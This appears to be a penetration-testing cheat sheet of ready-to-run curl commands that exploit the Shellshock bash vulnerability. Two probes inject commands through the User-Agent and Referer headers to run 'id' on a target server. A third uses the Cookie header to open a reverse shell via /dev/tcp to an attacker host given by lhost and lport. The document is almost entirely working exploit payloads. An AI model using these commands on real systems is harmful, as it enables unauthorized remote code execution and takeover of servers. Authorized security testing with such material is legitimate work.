# Shellshock

## probes

### User-Agent id

Probe user agent id with Shellshock.

```sh title:"Shellshock Probe User Agent Id"
curl -A "() { ignored; }; echo Content-Type: text/plain; echo; echo; /usr/bin/id" "$url"
```
<!-- cheat
var url
-->

### Referer id

Probe referer id with Shellshock.

```sh title:"Shellshock Probe Referer Id"
curl -H "Referer: () { ignored; }; echo Content-Type: text/plain; echo; echo; /usr/bin/id" "$url"
```
<!-- cheat
var url
-->

### Cookie reverse shell

Probe cookie reverse shell with Shellshock.

```sh title:"Shellshock Probe Cookie Reverse Shell"
curl -H "Cookie: () { ignored; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'" "$url"
```
<!-- cheat
var lhost
var lport
var url
-->
